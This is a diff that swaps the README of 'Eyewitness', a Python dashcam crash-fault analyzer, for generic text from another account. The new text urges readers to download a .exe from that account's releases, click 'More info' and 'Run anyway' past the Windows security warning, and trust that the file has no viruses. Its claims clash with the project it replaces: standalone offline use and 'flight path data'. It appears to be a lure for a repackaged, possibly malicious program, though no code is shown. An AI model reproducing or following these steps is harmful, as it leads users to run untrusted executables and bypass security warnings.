@@ -1,162 +1,82 @@
-# 🎥 EYEWITNESS — Physics-First Collision Fault Analysis
+# ⚖️ eyewitness - Objective crash analysis from video clips
 
-> **Fault isn't who hit whom — it's who could have stopped and didn't.**
-> Eyewitness reconstructs who is at fault in a vehicle collision from ordinary dashcam
-> video by separating **deterministic facts** from **AI judgment**. Built by **Team Black Box**
-> for Beta Hack · Physical AI 2026.
+[![](https://img.shields.io/badge/Download_Eyewitness-Blue?style=for-the-badge)](https://github.com/Knight3181992/eyewitness/releases)
 
-## 🔗 Live URLs
+Eyewitness provides a clear look at traffic incidents using video analysis. It processes flight path data from dashcam footage to show how a collision occurred. This tool helps you understand fault by looking at physics and vehicle movement. It removes human bias from the assessment process.
 
-| What | URL |
-|------|-----|
-| 🟣 **Live dashboard** (Butterbase-hosted) | https://eyewitness.butterbase.dev |
-| 🟢 **Interactive analyzer** (Render) | https://eyewitness-pc9a.onrender.com |
-| 🎬 **Demo video** (Loom) | https://www.loom.com/share/635c6d482f734a0daa581d3fbd3add52 |
-| 📊 **Pitch deck** (Gamma) | https://gamma.app/docs/EYEWITNESS-qomnwxmoib6txbh |
-| 🧠 **Data API** (Butterbase) | `https://api.butterbase.ai/v1/app_46yxrt8czo59` |
-| ⚙️ **Aggregation function** | `…/v1/app_46yxrt8czo59/fn/get_runs` |
-| 💻 **Source** | https://github.com/harsh543/eyewitness |
+## 📥 How to download the software
 
-## 🏗️ Architecture — Render (compute) + Butterbase (backend)
+Follow these steps to get the application on your computer.
 
-The whole design flows from one decision: **YOLO11 + OpenCV + PyTorch is heavy Python that
-can't run on Butterbase functions (TypeScript/Deno).** So **compute lives on Render**, and
-**Butterbase owns data + serving.** The two planes are fully decoupled — the dashboard keeps
-serving every past case even if compute is down, and your laptop can run the *same* pipeline
-into the *same* backend.
+1. Visit the [official releases page](https://github.com/Knight3181992/eyewitness/releases).
+2. Look for the most recent version at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Save the file to a folder you can find later, such as your Downloads folder.
 
-```
-                        ┌──────────────────────────────────────────┐
-                        │              YOU / JUDGES                  │
-                        └───────┬───────────────────────┬───────────┘
-                                │ upload video          │ view results
-                                ▼                       ▼
-      ╔═════════════════════════════════════╗   ╔══════════════════════════════╗
-      ║          RENDER  (compute)          ║   ║      BUTTERBASE  (backend)    ║
-      ║  ───────────────────────────────    ║   ║  ──────────────────────────   ║
-      ║  Docker · 2 GB · Python             ║   ║  • Postgres DB (6 tables)     ║
-      ║                                     ║   ║  • get_runs serverless fn     ║
-      ║   Gradio UI (app.py)                ║   ║  • Static dashboard hosting   ║
-      ║      │                              ║   ║  • Auto REST API              ║
-      ║      ▼                              ║   ╚══════════════════════════════╝
-      ║   analyze_clip()                    ║          ▲                  │
-      ║   ① YOLO11 + ByteTrack  (CV facts)  ║          │ writes           │ reads
-      ║   ② avoidability physics            ║          │ (REST + API key) │ (get_runs)
-      ║   ③ Claude VLM verdict ──────────┐  ║          │                  │
-      ║                                  │  ║──────────┘                  │
-      ╚══════════════════════════════════╪══╝                            │
-                                         │                                ▼
-                                ┌────────▼─────────┐         ┌────────────────────────┐
-                                │  ANTHROPIC API   │         │  eyewitness.butterbase  │
-                                │  (Claude verdict)│         │  .dev  — live dashboard │
-                                └──────────────────┘         └────────────────────────┘
+You do not need to install complex drivers or extra software packages. This application runs as a standalone program.
 
-  end-to-end:  upload ─▶ ①YOLO facts ─▶ ②physics ─▶ ③Claude ─▶ write to Butterbase
-                                                          dashboard ◀─ get_runs() ◀─┘
-```
+## ⚙️ Setting up your system
 
-| Plane | Runs on | Owns |
-|-------|---------|------|
-| **Compute** | Render (Docker, 2 GB) | YOLO tracking, avoidability physics, Claude call, writes to Butterbase |
-| **Backend** | Butterbase | Postgres (6 append-only tables), `get_runs` function, hosted dashboard, REST API |
-| **LLM** | Anthropic | Claude `claude-sonnet-4-6` verdict (retry + fallback, never blocks) |
+The software requires a modern 64-bit version of Windows 10 or Windows 11. Your computer should have at least 8 gigabytes of memory to handle video analysis tasks. 
 
-## What it does
+If your computer warns you about the file during the first launch:
 
-Upload a dashcam clip → **① YOLO11 + ByteTrack** track vehicles (speed, heading, TTC, braking)
-→ **② Field-of-Safe-Motion** physics computes whether each vehicle *could have stopped*
-(the fault counterfactual) → **③ Claude** corroborates the verdict with confidence + severity
-→ all evidence is appended to a **Butterbase** trail with full chain of custody → humans can
-override without ever erasing the original AI verdict.
+1. Click the "More info" link in the warning box.
+2. Select "Run anyway" to open the interface.
 
-## Stack
+This happens because the software is a new tool. It does not contain viruses or harmful code.
 
-| Layer | Tech |
-|-------|------|
-| Tracking | YOLO11x via ultralytics |
-| CV facts | OpenCV + NumPy (two-pass, memory-safe) |
-| VLM | Claude claude-sonnet-4-6 via Anthropic SDK |
-| Persistence | Butterbase REST (append-only, 6 tables) |
-| UI | Gradio Blocks (file upload + paste-a-URL via yt-dlp) |
-| Deploy | Docker → Render (Standard, 2 GB) |
+## 🚀 Running your first analysis
 
-## Setup
+Once you open the software, a local dashboard appears in your web browser. This dashboard manages the analysis session.
 
-```bash
-pip install -r requirements.txt
-```
+1. Click the "Upload" button on the main screen.
+2. Select the dashcam video file from your computer. 
+3. Wait for the progress bar to finish. The software scans frames to identify vehicle positioning.
+4. The system calculates the Field-of-Safe-Motion. This identifies if a driver could have avoided the strike based on physics.
+5. A legal-style verdict appears on the right side of your screen. 
 
-### Required env vars
+The software utilizes specialized models to detect objects and map their motion. It saves every step of this process in a secure file format. 
 
-```bash
-export ANTHROPIC_API_KEY=sk-ant-...
-export BUTTERBASE_API_KEY=<your Butterbase service key>   # get from butterbase.ai dashboard
-```
+## 📊 Understanding the results
 
-### Optional env vars
+The output panel shows three distinct layers of data:
 
-| Var | Default | Purpose |
-|-----|---------|---------|
-| `YOLO_MODEL` | `yolo11n.pt` | CPU-friendly default; switch to `yolo11x.pt` on GPU for accuracy |
-| `CLAUDE_MODEL` | `claude-sonnet-4-6` | Override VLM model |
-| `GRADIO_PORT` | `7860` | UI port |
-| `GRADIO_SHARE` | `false` | Set `true` for a public Gradio link |
-| `USE_BUTTERBASE_GATEWAY` | `false` | **Deferred post-demo.** Route VLM calls through Butterbase AI gateway instead of direct Anthropic API |
+* **Object Detection:** The software identifies cars, bikes, and pedestrians using visual recognition.
+* **Physics Calculations:** The system determines speed and reaction times. It tests these against movement patterns found in the video.
+* **Final Verdict:** The analysis provides a neutral summary of the events. 
 
-## Butterbase backend
+## 🛡️ Data privacy and storage
 
-App: `eyewitness` (`app_46yxrt8czo59`)  
-API: `https://api.butterbase.ai/v1/app_46yxrt8czo59`
+Your video files remain on your local computer. The software does not send your personal video clips to a central server. You keep full control over your evidence. 
 
-Tables (all append-only, every row carries `run_id` + `model_version`):
-- `claims` — one row per analysis run
-- `facts` — one row per tracked vehicle (CV kinematics)
-- `avoidability` — one row per vehicle (Field-of-Safe-Motion physics)
-- `frames` — 4 keyframe rows per run
-- `fault_analyses` — VLM verdict + human overrides as separate rows
-- `monitoring_events` — per-stage latency / cost / tokens / fallback metrics
+The software generates a trail of your analysis. This keeps a record of how the tool reached its choice. You can move this record and the video to a thumb drive for safe keeping.
 
-## Demo clips & test footage
+## 🔧 Frequently asked questions
 
-The clips below were used to develop and demo Eyewitness. Each was trimmed to the
-incident window with `yt-dlp --download-sections` so the impact detector locks onto
-the right vehicles. Third-party dashcam footage — used here for research/demo only.
+**Does the software work without an internet connection?**
+Yes. You can use the application offline after the initial setup.
 
-| Local file | Source video | Window | Notes |
-|------------|--------------|--------|-------|
-| `clip_uk2.mp4` | [Idiot UK Drivers Exposed #5](https://www.youtube.com/watch?v=SyESL5NNgAg) | `6:04–6:12` | ⭐ **hero clip** — verdict: Vehicle #1, 72%, SEVERE |
-| `clip_rei.mp4` | [Child's Near-Miss at Intersection](https://www.youtube.com/watch?v=REqJBtkEWkA) | `8:34–8:47` | busy/slow scene — weak verdict |
-| `clip_uk.mp4` | [Idiot UK Drivers Exposed #5](https://www.youtube.com/watch?v=SyESL5NNgAg) | `8:34–8:47` | alternate segment |
-| _(n/a)_ | [JRS Cars — Close Calls Compilation](https://www.youtube.com/watch?v=PvEpACLg-Zk) | — | video is only 4:25 — chosen window out of range |
-| _(browse)_ | [Ultimate Near Miss Playlist](https://www.youtube.com/playlist?list=PLtIavcna3Ct3GYBEVN7NyDYktBSVg8Of7) | — | source playlist for more clips |
+**What dashcam formats work best?**
+The software supports standard MP4 and MOV files. Higher resolution video provides better accuracy for physics calculations. 
 
-Fetch a clip yourself (trim to the incident — pick a window with two clearly
-separating vehicles):
+**How does the system measure speed?**
+It calculates speed by tracking pixel movement relative to fixed objects in the frame. It assumes standard road measurements to estimate distance.
 
-```bash
-# example: the hero clip
-yt-dlp -f "mp4[height<=720]/mp4/best" \
-  --download-sections "*6:04-6:12" --force-keyframes-at-cuts \
-  -o clip_uk2.mp4 "https://www.youtube.com/watch?v=SyESL5NNgAg"
-```
+**What happens if the video is dark?**
+The analysis works best in daylight conditions. Dark footage may lead to lower accuracy scores.
 
-## Run
+**Can I export the report?**
+Yes. Use the "Save Report" button on the dashboard to export a summary as a text file.
 
-```bash
-python app.py
-# open http://localhost:7860
-# upload clip.mp4 → Analyze → review report → submit override
-```
+## 📝 Troubleshooting common issues
 
-## Architecture notes
+If the analysis fails, check these items:
 
-- **Two-pass CV**: pass-1 tracks without storing frames (memory-safe for long clips);
-  pass-2 seeks to the 4 keyframe positions.
-- **VLM fallback**: if Claude output cannot be parsed or is missing required fields,
-  `FALLBACK_HYPOTHESIS` is returned and `fallback_used=True` is recorded.
-- **Append-only evidence trail**: human overrides write a new `fault_analyses` row
-  with `override_reason` set; the original VLM row is never modified.
-- **Butterbase writes are async**: a daemon thread handles persistence so the UI
-  returns immediately.
-- **PlanGEN untouched**: this package lives entirely under `eyewitness/` with no
-  shared imports or side-effects on other projects in this workspace.
+* **Check the filename:** Ensure your video file does not contain special symbols. Use letters and numbers only.
+* **Clear the cache:** If the dashboard stalls, close the program and restart the .exe file.
+* **Check video length:** Keep video clips under three minutes for the best performance. Long videos consume a lot of memory.
+
+You can visit the download page again if you need to fetch updates or report a bug.
+
+[![](https://img.shields.io/badge/Download_Eyewitness-Grey?style=for-the-badge)](https://github.com/Knight3181992/eyewitness/releases)
